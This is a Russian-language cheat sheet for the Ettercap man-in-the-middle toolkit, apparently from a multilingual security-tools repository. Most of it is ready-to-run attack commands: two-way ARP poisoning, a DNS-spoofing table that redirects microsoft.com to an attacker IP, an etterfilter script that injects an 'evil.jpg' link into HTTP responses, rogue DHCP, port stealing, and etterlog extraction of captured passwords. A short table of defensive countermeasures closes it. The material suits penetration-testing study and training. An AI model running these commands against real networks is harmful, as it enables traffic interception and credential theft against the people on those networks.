<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Шпаргалка по Ettercap

[Ettercap](https://www.ettercap-project.org/) — это комплексный пакет для атак «человек посередине» (MITM) на локальные сети (LAN). Он обеспечивает перехват активных соединений, фильтрацию контента на лету, активное и пассивное анализ многих протоколов, а также поддержку отравления ARP, перенаправления ICMP, подмены DHCP и кражи портов.

---

## Содержание

- [Основная архитектура и режимы](#core-architecture--modes)
- [Установка и быстрая настройка](#installation--quick-setup)
- [Отравление и перехват ARP](#arp-poisoning--обнюхивание)
- [Атаки спуфинга DNS](#dns-spoofing-attacks)
- [Пользовательская фильтрация пакетов (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [Подмена DHCP и кража портов](#dhcp-spoofing--port-stealing)
- [Журналирование и извлечение пакетов](#logging--packet-extraction)
- [Защитное обнаружение и контрмеры](#defensive-detection--countermeasures)

---

## Основная архитектура и режимы

Ettercap поддерживает несколько режимов выполнения:
- **`-T` (Текстовый режим):** Легкий вывод терминала без проклятий, идеально подходящий для написания сценариев и автономной автоматизации.
- **`-C` (режим Curses):** Пользовательский интерфейс терминала на основе Ncurses для интерактивных операций без X11.
- **`-G` (режим GTK):** Полный графический интерфейс.
- **`-D` (режим Daemon):** работает в фоновом режиме.

Синтаксис целевой спецификации:
```text
/MAC/IPs/IPv6/PORTs
```
- Цели могут быть разделены запятыми или диапазонами IP-адресов: `//` соответствует всему.
- Пример: `/192.168.1.50/` нацелен на IP `192.168.1.50` на всех портах.
- Пример: `//80,443/` нацелен на все хосты на портах 80 и 443.

---

## Установка и быстрая настройка
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Проверьте расположение файла конфигурации:
- `/etc/ettercap/etter.conf`: конфигурация базовой сети и сброса привилегий.
- `/etc/ettercap/etter.dns`: таблица поиска записей подмены DNS.

---

## Отравление и перехват ARP

### 1. Двустороннее удаленное отравление ARP
Отравить таблицы ARP между целевой рабочей станцией и сетевым шлюзом:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: текстовый режим.
- `-q`: Тихий режим (уменьшает многословие, отображает только захваченные учетные данные).
- `-i eth0`: сетевой интерфейс прослушивания и внедрения.
- `-M arp:remote`: выполнить двунаправленное отравление ARP «человек посередине».

### 2. Анализ всей подсети (односторонний / широковещательный)
Отравите все хосты в подсети шлюзом по умолчанию:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Только пассивное обнюхивание
Захватывайте учетные данные в виде открытого текста, проходящие через текущий хост, без подмены ARP:
```bash
sudo ettercap -T -q -i eth0
```
---

## DNS-спуфинг-атаки

Ettercap включает встроенные плагины, включая `dns_spoof`.

### Шаг 1. Настройте `/etc/ettercap/etter.dns`
Добавьте подстановочный знак или перенаправление конкретного домена:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Шаг 2. Запустите Ettercap с плагином DNS
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: активирует плагин подмены DNS.
- Перехваченные DNS-запросы, соответствующие `etter.dns`, возвращают IP-адрес злоумышленника.

---

## Пользовательская фильтрация пакетов (`etterfilter`)

Ettercap позволяет проверять пакеты в реальном времени и изменять полезную нагрузку с помощью пользовательских сценариев фильтрации.

### 1. Написать скрипт фильтра (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Скомпилируйте фильтр с помощью `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Выполнить с фильтром
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## Подмена DHCP и кража портов

### 1. Мошенническая атака DHCP-сервера
Реагируйте быстрее, чем законный DHCP-сервер, чтобы назначить мошеннический шлюз и адреса DNS:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Синтаксис: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Атака с перехватом портов (переполнение коммутатора/злоупотребление таблицей CAM)
Кража трафика в коммутируемых сетях, где отравление ARP блокируется или предупреждается:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Журналирование и извлечение пакетов

### Сохранение необработанных записанных сеансов
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: запись необработанных данных пакета pcap.
- `-L ettercap_log`: записывайте подробные текстовые журналы, читаемые человеком.

### Преобразование двоичных журналов с помощью `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Защитное обнаружение и противодействие

| Вектор | Механизм обнаружения и защиты |
|---|---|
| **Подмена ARP** | Включите динамическую проверку ARP (DAI) на управляемых коммутаторах; проверьте `arp -a` на наличие дубликатов MAC; запустите `arpwatch` или `arpon`. |
| **Подмена DNS** | Примените DNSSEC, DoH (DNS-over-HTTPS) или DoT (DNS-over-TLS). |
| **Подмена DHCP** | Включите отслеживание DHCP на коммутаторах, чтобы назначить доверенные порты восходящей линии связи. |
| **Кража портов** | Внедрите управление доступом к сети 802.1X (NAC) и безопасность портов с ограничениями MAC-адресов для каждого порта коммутатора. |